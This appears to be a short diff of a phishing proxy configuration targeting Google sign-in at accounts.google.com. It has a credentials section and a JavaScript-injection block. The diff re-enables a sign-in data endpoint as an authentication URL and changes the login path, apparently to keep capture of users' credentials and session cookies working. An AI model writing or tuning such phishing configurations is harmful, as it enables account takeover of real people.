@@ -30,11 +30,11 @@ credentials:
 
 auth_urls:
   - '/CheckCookie'
-#  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
+  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
 
 login:
   domain: 'accounts.google.com'
-  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+  path: '/Servicelogin'
 
 js_inject:
   - trigger_domains: ['accounts.google.com']
